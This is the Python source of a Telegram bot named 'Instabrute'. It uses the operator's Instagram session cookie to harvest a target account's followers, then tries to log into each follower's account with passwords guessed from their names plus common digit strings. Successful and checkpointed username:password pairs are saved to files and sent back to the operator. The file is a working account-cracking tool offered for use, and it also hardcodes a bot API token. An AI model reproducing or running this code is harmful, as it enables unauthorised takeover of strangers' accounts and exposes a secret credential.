import telebot
import time
import os
import json
import requests
import random
from telebot.types import InlineKeyboardButton, ForceReply, InlineKeyboardMarkup, CallbackQuery
from urllib.parse import unquote
from threading import Thread
from keep_alive import keep_alive

keep_alive()
bot = telebot.TeleBot('6777370057:AAFH6G5iqiaBloief_xk356wz3T7uPK7R4g')

user_states = {}
target = []
followers=[]
user_hack=[]

def save_cookie(cookie):
  with open('cookie.txt', 'w') as file:
    return file.write(cookie)

def load_cookie():
  with open('cookie.txt','r') as file:
    return file.read()

def save_username(file):
  with open('usernames.txt','a') as files:
    return files.write(file + '\n')
    
def change_to_json(file):
  key_value_pairs = file.split(';')
  cookie_dict={}
  for pairs in key_value_pairs:
    key, value = pairs.split('=')
    cookie_dict[key.strip()] = unquote(value.strip())
  json_out = json.dumps(cookie_dict, indent=4)
    # with open('cookie.json','w') as files:
#       return files.write(json_out)
  return json_out
  
def load_json():
  with open('cookie.json','r') as cookies:
    return json.load(cookies)
    
@bot.message_handler(commands=["start"])
def greeting(message):
  chat_id = message.chat.id
  username = message.from_user.username
  teks = f"Hy, @{username}. Type *!help* for help you."
  bot.send_chat_action(chat_id, 'typing')
  time.sleep(1)
  bot.reply_to(message, teks, parse_mode="Markdown")

@bot.message_handler(func=lambda message:message.text == '!help')
def show_help(message):
  chat_id = message.chat.id
  teks = f"Instabrute command:\n\n*!set* : for set your instagram cookie. <required>\n*!crack* : starting crack.\n\nHappy Hacking :)."
  bot.send_chat_action(chat_id, 'typing')
  time.sleep(1)
  
  bot.reply_to(message, teks, parse_mode="Markdown")

@bot.message_handler(func=lambda message:message.text == '!set')
def show_help(message):
  chat_id = message.chat.id
  markup = InlineKeyboardMarkup()
  markup.add(InlineKeyboardButton('Delete', callback_data='delete'))
             
  if os.path.exists('cookie.txt'):
    bot.send_chat_action(chat_id, 'typing')
    time.sleep(1)
    bot.reply_to(message, 'Your cookie file is exists!', reply_markup=markup)
  else:
    markup = ForceReply(selective=False)
    bot.send_chat_action(chat_id, 'typing')
    time.sleep(1)
    
    bot.reply_to(message, 'Send me your instagram cookie!', reply_markup=markup)
    #print(message.text)
    
    user_states[chat_id] = 'awaiting cookie'

@bot.message_handler(func=lambda message: user_states.get(message.chat.id, None) =='awaiting cookie')
def get_cookie(message):
  chat_id=message.chat.id
  cookie = message.text
  save = save_cookie(cookie)
  bot.reply_to(message, f"setting cookie success! type *!crack* for starting crack.", parse_mode="Markdown")
  
  user_states[chat_id] = 'waiting cookie'
  
@bot.message_handler(func=lambda message: message.text == '!crack')
def start_crack(message):
  
  try:
    chat_id = message.chat.id
    cookie = load_cookie()
    url = 'https://i.instagram.com/api/v1/accounts/current_user/'
    ig_cookie = change_to_json(cookie)
    cookies = json.loads(ig_cookie)
    clean_cookie = {key: value.replace('\n', '') for key, value in cookies.items()}
    
    #bot.send_message(chat_id, clean_cookie.get('csrftoken'))
    headers = {
      'User-Agent': 'Instagram 123.0.0.26.115 Android',
      'Accept': '*/*',
      'Accept-Encoding': 'gzip, deflate',
      'Accept-Language': 'en-US',
      'X-IG-Capabilities': '3brTvw==',
      'X-IG-Connection-Type': 'WIFI',
      "X-CSRFToken": clean_cookie.get('csrftoken'),
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Referer': 'https://www.instagram.com/',
      'Host': 'i.instagram.com'
    }
    
    
    #session = requests.Session().max_redirects=100
    response = requests.get(url, cookies=clean_cookie, headers=headers)
    #bot.send_message(chat_id, response.text)
    if response.status_code == 200:
      username = response.json()['user']['username']
      markup = InlineKeyboardMarkup(row_width=2)
      markup.add(InlineKeyboardButton('Followers', callback_data='followers'),
                InlineKeyboardButton('Likes Post', callback_data='likes'))
      teks = f"Login successfully!\nLogin as *{username}*.\n\nYou want crack from?"
      bot.send_chat_action(chat_id, 'typing')
      time.sleep(1)
      bot.reply_to(message, teks, parse_mode='Markdown', reply_markup=markup)
    else:
      bot.send_chat_action(chat_id,'typing')
      time.sleep(1)
      bot.reply_to(message, str(response.text) + '\n\nType *!set* and delete your old cookie.', parse_mode='Markdown')
  except FileNotFoundError as err:
    bot.send_chat_action(chat_id, 'typing')
    time.sleep(1)
    bot.reply_to(message, err)
    
    
@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call: CallbackQuery):
  chat_id = call.message.chat.id
  message_id = call.message.message_id
  
  if call.data == 'followers':
    bot.send_chat_action(chat_id, 'typing')
    time.sleep(1)
    #markup = ForceReply(selective=False)
    bot.edit_message_text('Send me a username target!', chat_id, message_id)
    
    user_states[chat_id]='await username'

  elif call.data == 'delete':
      os.remove('cookie.txt')
      bot.send_chat_action(chat_id, 'typing')
      time.sleep(1)
      bot.send_message(chat_id,'Your cookie has been delete. type *!set* for set your cookie again.', parse_mode='Markdown')

@bot.message_handler(func=lambda message: user_states.get(message.chat.id, None) == 'await username')
def get_target(message):
    chat_id = message.chat.id
    cookie = load_cookie()
    ig_cookie = change_to_json(cookie)
    cookies = json.loads(ig_cookie)
    clean_cookie = {key: value.replace('\n', '') for key, value in cookies.items()}
    target_username = message.text.lower()
    message_id = message.message_id
    
    bot.send_message(chat_id, f'Trying to fetch followers from *{target_username}*', parse_mode='Markdown')
    
    headers = {
        'User-Agent': 'Instagram 123.0.0.26.115 Android',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        "X-CSRFToken": clean_cookie.get('csrftoken'),
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Referer': 'https://www.instagram.com/',
        'Host': 'i.instagram.com'
    }
    
    url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={target_username}"
    response = requests.get(url, headers=headers, cookies=clean_cookie, allow_redirects=False)
    if response.status_code == 200:
        user_info = response.json()
        target.append(user_info['data']['user']['id'])
    else:
        bot.send_chat_action(chat_id, 'typing')
        time.sleep(1)
        bot.send_message(chat_id, f'Status: {response.json}')
        return
    
    url_followers = f'https://i.instagram.com/api/v1/friendships/{target[0]}/followers/'
    next_max_id = ''
    fetched_count = 0
    request_count = 0
    
    last_message_id = bot.send_message(chat_id, 'Starting to fetch followers...').message_id
    unique_followers = []
    
    while True:
        params = {'max_id': next_max_id} if next_max_id else {}
        response = requests.get(url_followers, headers=headers, cookies=clean_cookie, params=params)
        if response.status_code != 200:
            bot.send_message(chat_id, f"Failed to fetch followers: {response.json()}")
            break
        
        users = response.json().get('users', [])
        for data in users:
            unique_followers.append(data["username"])
            save_username(data["username"])
        if not users:
            break
        
        fetched_count += len(users)
        request_count += 1
        
        # Update message every 5 requests to reduce the API call frequency
        #if request_count % 5 == 0:
            #try:
        bot.send_chat_action(chat_id,'typing')
        time.sleep(0.5)
        bot.edit_message_text(f"Fetched {fetched_count} followers...", chat_id, last_message_id)
            #except Exception as e:
                #print(f"Failed to edit message: {e}")
        
        next_max_id = response.json().get('next_max_id', '')
        if not next_max_id:
            break
        
        # Add delay to avoid hitting rate limits
        time.sleep(1)
    
    bot.send_chat_action(chat_id,'typing')
    time.sleep(0.5)
    bot.send_message(chat_id, f"Finished fetching followers *{target_username}*.\nTotal: *{len(unique_followers)}* followers", parse_mode="Markdown")
    print(f"Total followers fetched: {len(unique_followers)}")
    last_message = bot.send_message(chat_id, 'Main crack will be starting!').message_id
    time.sleep(0.5)
    
    main_crack(chat_id, last_message, clean_cookie)
      #(chat_id, response.json().get('users')["username"])
def save_oke(file):
  with open('hacked.txt','a') as files:
    return files.write(file)
    
def save_cp(file):
  with open('checkpoint.txt','a') as files:
    return files.write(file)
    
def main_crack(chat_id, message_id, cookie):
    request_count = 0
    headers = {
        'User-Agent': 'Instagram 123.0.0.26.115 Android',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        "X-CSRFToken": cookie.get('csrftoken'),
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Referer': 'https://www.instagram.com/',
        'Host': 'i.instagram.com'
    }
    
    try:
      with open('usernames.txt', 'r') as file:
          usernames = file.readlines()
      
      for username in usernames:
        request_count += 1
        usr_name = username.strip()  # Menghilangkan newline
        
        url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={usr_name}"
        response = requests.get(url, headers=headers, cookies=cookie,allow_redirects=False)
        time.sleep(1)
        print(response.json().get('status'))
        if response.status_code == 200:
          try:
            data = response.json()["data"]["user"]["full_name"]
            split_name = data.split(' ')
            fname = split_name[0].lower() if split_name else ''
            lname = split_name[-1].lower() if len(split_name) > 1 else fname
            number = ['123', '12345', '321', '54321', '1234', '12345678', '123456', '123456789', '9876', '8765', '7654']
            initial = [fname, lname]
            guest_number = random.choice(number)
            guest_initial = random.choice(initial)
            password = guest_initial + guest_number
            
            login_url = 'https://i.instagram.com/api/v1/accounts/login/'
            data = {
                'username': usr_name,
                'password': password,
                'device_id': 'android-1234567890abcdef',
                'login_attempt_count': '0',
            }
            
            response_log = requests.post(login_url, headers=headers, data=data, allow_redirects=False)
            time.sleep(2)
            
            teks = f'Trying login as *{usr_name}*!\n\nStatus: *{response_log.json().get("status")}*'
            bot.send_chat_action(chat_id, 'typing')
            time.sleep(0.5)
            bot.edit_message_text(teks, chat_id, message_id, parse_mode="Markdown")
                
            if response_log.status_code == 200 and 'logged_in_user' in response_log.json():
                #if request_count % 5 == 0:
                  #try:
                    # teks = f'Trying login as *{usr_name}*!\n\nStatus: *{response_log.json()["message"]}*'
#                     bot.send_chat_action(chat_id, 'typing')
#                     time.sleep(0.5)
#                     bot.edit_message_text(teks, chat_id, message_id, parse_mode="Markdown")
              user_data = f"{usr_name}:{password}"
              user_hack.append(user_data)
              save_oke(user_data + '\n')
              
                    #os.remove('usernames.txt')
                  #except Exception as err:
                    #print(err)
            elif 'checkpoint' in response_log.json():
                #if request_count % 5 == 0:
                  #try:
                    # teks = f'Trying login as *{usr_name}*!\n\nStatus: *{response_log.json()["message"]}*'
#                     bot.send_chat_action(chat_id, 'typing')
#                     time.sleep(0.5)
#                     bot.edit_message_text(teks, chat_id, message_id, parse_mode="Markdown")
              user_data = f"{usr_name}:{password}"
              user_hack.append(user_data)
              save_cp(user_data + '\n')
                    #os.remove('usernames.txt')
                  #except Exception as err:
                    #print(err)
            #else:
                #if request_count % 5 == 0:
                  #try:
           
          
          except KeyError:
            print(f"User data not found for {usr_name}")
            continue
        else:
            print(response.text)
            #print(f"Failed to fetch user info for {usr_name}")
            continue
      bot.send_message(chat_id,f'Finished cracking!\n\nResult: *{user_hack}*\nTotal: *{len(user_hack)}*', parse_mode='Markdown')
    except FileNotFoundError:
      pass
    
    
    #bot.send_message(chat_id, 'Finished cracking!')  
        
        
        
              #except Exception as err:
                #print(err)
                #os.remove('usernames.txt')
                
#def start_bot():
  #bot.infinity_polling(timeout=20, long_polling_timeout=10)
  
if __name__=="__main__":
  os.system('clear')
  try:
    os.remove('usernames.txt')
  except FileNotFoundError:
    pass
  print('bot running!')
  bot.infinity_polling()
  #Thread(target=start_bot).start()
